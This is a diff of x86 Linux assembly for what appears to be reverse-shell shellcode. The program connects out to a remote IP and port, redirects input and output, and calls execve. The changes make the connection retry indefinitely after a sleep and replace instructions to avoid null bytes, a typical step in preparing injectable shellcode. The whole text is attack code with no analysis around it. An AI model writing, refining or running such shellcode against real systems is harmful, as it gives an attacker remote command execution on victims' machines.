@@ -52,7 +52,6 @@ _start:
     mov         ax, CONNECT
     int         80h             ; execute
     inc         eax
-    mov         esi, 4
     cmp         eax, 1
     jne         retry
     jmp         continue
@@ -60,9 +59,10 @@ _start:
 ; If connection fails
 retry:
     xchg        edi, ebx
-    mov         eax, 162
+    xor         eax, eax
+    mov         al, 162
     mov         ebx, timeval
-    mov         ecx, 0
+    xor         ecx, ecx
     int         0x80
 ; Then connect to ip and port
     xor         ecx, ecx
@@ -83,12 +83,7 @@ retry:
     int         80h             ; execute
     inc         eax
     cmp         eax, 1
-    je          continue
-
-    dec         esi
-    cmp         esi, 1
     jne         retry
-    jmp         continue
 
 continue:
 ; Get input and redirect output
@@ -107,5 +102,5 @@ loop:
     mov         ecx, argv
     mov         edx, envv
 
-    mov         al, 0xb
+    mov         al, EXECVE
     int         80h
